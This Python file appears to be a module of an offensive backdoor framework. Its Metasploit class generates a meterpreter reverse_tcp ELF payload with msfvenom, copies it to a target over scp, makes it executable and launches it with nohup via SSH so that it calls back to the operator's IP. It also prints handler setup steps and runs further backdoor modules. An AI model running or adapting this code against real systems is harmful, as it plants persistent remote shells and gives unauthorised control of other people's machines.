from backdoor import *

class Metasploit(Backdoor):
    prompt = Fore.RED + "(msf) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Metasploit backdoor..."
        self.core = core
        self.payload = "linux/x86/meterpreter/reverse_tcp"
        self.options = {
                "payload" : Option("payload", "linux/x86/meterpreter/reverse_tcp", "payload to deploy in backdoor", True),
                "lport"   : Option("lport", 4444, "local port to connect back on", True),
                "lhost"   : Option("lhost", core.localIP, "local IP to connect back to", True),
                "format"  : Option("format", "elf", "format to write the backdoor to", True),
                "encoder" : Option("encoder", "none", "encoder to use for the backdoor", False),
                "name"    : Option("name", "initd", "name of the backdoor", False)
                }
        self.modules = {} 
        self.allow_modules = True

    def get_command(self):
        return "nohup ./%s > /dev/null" % self.get_value("name")
   
    def do_exploit(self, args):
        port = self.get_value("lport")
        payload = self.get_value("payload")
        name = self.get_value("name")
        bformat = self.get_value("format")
        target = self.core.curtarget
        #os.system("msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp lhost=10.1.0.1 lport=4444 --platform=Linux -o initd -f elf -e x86/shikata_ga_nai") #% ip_address)
        os.system("msfvenom -p %s LHOST=%s LPORT=%s -f %s X -o %s" % (payload, self.core.localIP, port, bformat, name))
        target.scpFiles(self, name, False)
        print(GOOD + "Backdoor script moved")
        target.ssh.exec_command("chmod +x "+name)
        print(GOOD + "Backdoor attempted on port %s. Backdoor will attempt to connect immediately upon launch. To access, open msfconsole and run:" % port)
        print("> use multi/handler")
        print("> set PAYLOAD %s" % payload)
        print("> set LHOST %s" % self.core.localIP)
        print("> exploit")
        raw_input(GOOD + "Press any key to launch exploit once msfconsole is listening...")
        target.ssh.exec_command(self.get_command())
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()

